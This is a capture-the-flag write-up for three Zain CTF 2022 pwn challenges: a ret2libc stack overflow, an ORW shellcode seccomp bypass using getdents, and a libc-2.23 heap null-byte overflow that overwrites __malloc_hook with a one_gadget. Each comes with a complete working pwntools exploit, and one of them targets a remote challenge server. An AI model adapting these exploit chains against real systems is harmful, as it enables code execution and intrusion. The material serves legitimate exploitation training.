#  Zain CTF 2022 Binary Exploitation Writeups
## Classy: 
#### Tags: Buffer Overflow - ret2libc
this is a classic ret2libc challenge 
##### PLAN : 
    1.Find offset to overwrite RIP
    2.Leak libc address using puts
    3.Calculate system and binsh adressess 
    4.Send last payload to pop shell
    
> 1.Finding offset : 
> 
![](https://i.imgur.com/F1rOtjg.png)

![](https://i.imgur.com/aSr9Iq0.png)

now we start constructing our exploit 

```python=
from pwn import * 
context.update(arch='amd64',os='linux',log_level='debug')
p = process('./main')
elf = ELF('./main', checksec=0)
libc = elf.libc
offset = 120
rdi = p64(0x00000000004012cb)
ret = p64(0x0000000000401020)
```

> 2.Leak libc using puts:

```python=
payload = flat(
    b"A" * offset,
    rdi,
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(elf.sym.main)
)
p.sendline(payload)
p.recvuntil('violence !')
p.recvline()
puts_got = u64(p.recv(6).ljust(8, b"\x00"))
log.success("puts@got" + hex(puts_got))
```
![](https://i.imgur.com/Rxrctpv.png)

>3.Calculate necessary addressess:

```python=
system = libc_base + libc.sym.system
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
```

>4. Sending last payload : 


```python=
final = flat(
    b"A"* offset,
    rdi,
    p64(binsh),
    ret,
    p64(system)
)
p.sendline(final)
p.interactive()
```

![](https://i.imgur.com/W3WGKaG.png)

>Full Exploit : 
```python=
from pwn import * 
context.update(arch='amd64',os='linux',log_level='debug')
#p = process('./main')
p = remote("18.144.22.223", 10024)
elf = ELF('./main', checksec=0)
#libc = elf.libc
libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")
offset = 120
rdi = p64(0x00000000004012cb)
ret = p64(0x0000000000401020)
payload = flat(
    b"A" * offset,
    rdi,
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(elf.sym.main)
)
p.sendline(payload)
p.recvuntil('violence !')
p.recvline()
puts_got = u64(p.recv(6).ljust(8, b"\x00"))
log.success("puts@got @ " + hex(puts_got))
libc_base = puts_got - libc.sym.puts
print(hex(libc_base))
system = libc_base + libc.sym.system
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
final = flat(
    b"A"* offset,
    rdi,
    p64(binsh),
    ret,
    p64(system)
)
p.sendline(final)
p.interactive()
```
> Flag : flag{ac95f35b9ba0ed11c79b8464341e9fb7d4514c816d65d141cb54d45d965c2859}

NB : for those who got problem determining the right libc version you can just obtain it from [here](https://libc.rip/).
## Stormy: 
#### Tags: Buffer Overflow - ret2shellcode - getdents - Seccomp
a classic ret2shellcode challenge but with a little twist where you need to write a shellcode to get the real file name of the flag file using getdents syscall
##### PLAN : 
    1.Send a getdents shellcode 
    2.Send an ORW shellcode to read the flag file

>1.Send a getdents shellcode : 
```python=
from pwn import * 
context.update(arch='amd64', os='linux', log_level='debug')
p = process('./main')
elf = ELF('./main', checksec=0)
offset = 120 
buf = int(p.recvline(), 16)
print(hex(buf))
shellcode = asm(shellcraft.open('.'))
shellcode += asm(shellcraft.getdents(3, 'rsp', 0x500))
shellcode += asm(shellcraft.write(1, 'rsp', 0x500))
payload = shellcode + b"A" * (offset - len(shellcode)) + p64(buf)
p.sendline(payload)
```
after sending the first payload we can notice the flag file name 
![](https://i.imgur.com/zyxKfaF.png)

We send the last payload to get the flag 
```python=
shell = asm(shellcraft.open('real_flag_file_txt.txt'))
shell += asm(shellcraft.read(3, 'rsp', 0x100))
shell += asm(shellcraft.write(1, 'rsp', 0x100))
payload = shell + b"A" * (offset - len(shell)) + p64(buf)
```

![](https://i.imgur.com/WvHKlIc.png)

>Full exploit : 

```python=
from pwn import * 
context.update(arch='amd64', os='linux', log_level='debug')
p = process('./main')
elf = ELF('./main', checksec=0)
offset = 120 
buf = int(p.recvline(), 16)
print(hex(buf))
"""
shellcode = asm(shellcraft.open('.'))
shellcode += asm(shellcraft.getdents(3, 'rsp', 0x500))
shellcode += asm(shellcraft.write(1, 'rsp', 0x500))
payload = shellcode + b"A" * (offset - len(shellcode)) + p64(buf)
#p.sendline(payload)
"""
shell = asm(shellcraft.open('real_flag_file_txt.txt'))
shell += asm(shellcraft.read(3, 'rsp', 0x100))
shell += asm(shellcraft.write(1, 'rsp', 0x100))
payload = shell + b"A" * (offset - len(shell)) + p64(buf)

p.sendline(payload)
p.interactive()
```
> Flag : flag{703810818b509059eea4f913c0f9c507b58dc758a426b76713b02ff63501bb24}

## Vault: 
#### Tags: off by one - Null byte overflow - overlapping chunks - one_gadget
This is a classic heap challenge where our main goal consists to get an overlapping chunk then we overwrite one of the hooks with one_gadget and we get a shell.
Since we are provided with libc we can determine what are we dealing with .
``Libc-2.23`` uses fastbins as the first singly linked list so we can abuse it to get a shell.
##### PLAN : 
    1.Prepare The heap layout so we can get a leak and use after the leak. 
    2.Leak libc address.
    3.Compute necessary addressess.
    4.Overwrite __malloc_hook with one_gadget.
> 0. Bug hunting:

I am not going to explain what every function does i'm just going straight to the point where the bug occures.

``read_line() function:``
![](https://i.imgur.com/DW1ORFc.png)
We notice that it reads until it reachs the provided size value then it just appends a null byte in the end. the bug here if we fill a chunk we allocated we can corrupt the next chunk metadata in a way where we can use it in a variety of different ways.(A solution to these kind of bug in our situtation is to read until size - 1).
> 1. Preparing the heap : 

first we create so function helpers to make it more reliable.

```python=
#!/usr/bin/env python3
from pwn import *
import time
context.update(arch="amd64", os="linux", log_level="debug")

p = process("./main_patched")
elf = ELF('./main_patched')
libc = ELF("./libc-2.23.so")


def sl(choice): p.sendlineafter('> ',str(choice))
def alloc(idx,size,data):
    sl('1')
    p.sendlineafter(b'index: ',str(idx))
    p.sendlineafter(b'size: ',str(size))
    p.sendlineafter(b'Content:',data)
def free(idx):
    sl('3')
    p.sendlineafter(b'index: ',str(idx))
def edit(idx,data):
    sl('2')
    p.sendlineafter(b'index: ',str(idx))
    p.sendlineafter(b'Content: ',data)
def show(idx):
    sl('4')
    p.sendlineafter(b'index: ',str(idx))
```

So let's create some chunks and we will discuss our strategie.

```python=
    alloc(0, 0xf8, "A"*0xf7)
    alloc(1, 0x68, "B"*0x67)
    alloc(2, 0xf8, "C"*0xf7)
    alloc(3, 0x10, "D"*0x9)
```
so after those allocations our heap area should look like this 

![](https://i.imgur.com/crxGieH.png)

> 2.Leak libc addres: 

the plan is going to abuse the null byte overflow by overwriting the ``prev_inuse`` bit from ``1`` to ``0`` to mark the previous chunk as a free chunk .
while we are filling the chunk until we overwrite the prev in use bit we also will overwrite the ``prev_size`` field so we can get a chunk where we can have control over.
```python=
    free(0)
    edit(1, b"A"*0x60 + p64(0x170))
    free(2)
    alloc(0, 0xf8, "E"*0xf7)
    show(1)
    p.recvuntil("Content: ")
    libc_base = u64(p.recv(6).ljust(8,b"\x00")) - (libc.sym.main_arena + 88)
    log.success("Libc base @  " + hex(libc_base))
```
So basically we are freeing the first chunk then we are editing from chunk 1 and filling it until we reach the ``prev_size`` field. overwriting ``prev_size`` field with the size of first chunk and second chunk combined (idx0 + idx1 which is 0x100 + 0x70 = 0x170) and then overwriting the ``prev_inuse`` bit of the third chunk.
now we created a layout where our next free will return an unsorted bin chunk. by freeing the third chunk which holds the idx=2 we have an usorted bin chunk that contains a libc adresse (``main_arena + 88``)
now we need to push those adresses to a chunk that we can read from ( idx = 1 for our case)
Re-allocating idx 0 chunk with the same chunk size will push the libc addresses to idx 1 chunk now we have a libc addresse in a chunk we can read from we just use show function and adjust the adresses.

>3.Compute necessary addressess:

```python=
    hook = libc_base + (libc.sym["__malloc_hook"] - 0x23)
    one = libc_base + 0xf1247
```
we are going to overwrite the __malloc_hook we a one_gadget which can be obtained from [here](https://github.com/david942j/one_gadget).

>4.Overwrite __malloc_hook with one_gadget:

```python=
    alloc(4,0x68, "A"*0x10)
    free(1)
    payload = b"A" * 0x13 + p64(one) * 2
    edit(4, p64(hook))
    alloc(5, 0x68, "")
    alloc(6, 0x68, payload)
    p.sendline("1")
    p.sendline("8")
    p.sendline("52")
```
So we just put the adress of the computed __malloc_hook in the Forward pointer of a singly linked list which is fastbins in our case (idx = 1).
Re-allocating again with the same size will return the same chunk we used previously and puts the address of __malloc_hook - 0x23 as the next chunk that will be server for next allocation if it meets the needed requirements.
we just allocate another chunk with the same size and put our payload that overwrites __malloc_hook with one_gadget.
last step will be triggering a malloc call which is done by just creating a random chunk and a malloc call will be done (our one_gadget will be executed.)

![](https://i.imgur.com/qwTtpI4.png)

> Full exploit : 
```python=
#!/usr/bin/env python3
from pwn import *
import time

context.update(arch="amd64", os="linux", log_level="debug")

p = process("./main_patched")
elf = ELF('./main_patched')
libc = ELF("./libc-2.23.so")

def sl(choice): p.sendlineafter('> ',str(choice))
def alloc(idx,size,data):
    sl('1')
    p.sendlineafter(b'index: ',str(idx))
    p.sendlineafter(b'size: ',str(size))
    p.sendlineafter(b'Content:',data)
def free(idx):
    sl('3')
    p.sendlineafter(b'index: ',str(idx))
def edit(idx,data):
    sl('2')
    p.sendlineafter(b'index: ',str(idx))
    p.sendlineafter(b'Content: ',data)
def show(idx):
    sl('4')
    p.sendlineafter(b'index: ',str(idx))

def main():
    pause()
    alloc(0, 0xf8, "A"*0xf7)
    alloc(1, 0x68, "B"*0x67)
    alloc(2, 0xf8, "C"*0xf7)
    alloc(3, 0x10, "D"*0x9)
    free(0)
    edit(1, b"A"*0x60 + p64(0x170))
    free(2)
    alloc(0, 0xf8, "E"*0xf7)
    show(1)
    p.recvuntil("Content: ")
    libc_base = u64(p.recv(6).ljust(8,b"\x00")) - (libc.sym.main_arena + 88)
    log.success("Libc base @  " + hex(libc_base))
    alloc(4,0x68, "A"*0x10)
    free(1)
    hook = libc_base + (libc.sym["__malloc_hook"] - 0x23)
    one = libc_base + 0xf1247
    print(hex(hook))
    print(hex(one))
    payload = b"A" * 0x13 + p64(one) * 2
    edit(4, p64(hook))
    alloc(5, 0x68, "")
    alloc(6, 0x68, payload)
    p.sendline("1")
    p.sendline("8")
    p.sendline("52")
    p.interactive()

if __name__ == "__main__":
    main()
```
> Flag : flag{a25a6c94b16088d7cf0cccc768283e57bab243eaeb97fb1a2b9459eb247168d6}

NB: I patched the binary using [pwninit](https://github.com/io12/pwninit).


#### I hope you guys enjoyed those challs.
#### Reach me out on discord for further information : ``Retr0#7958``
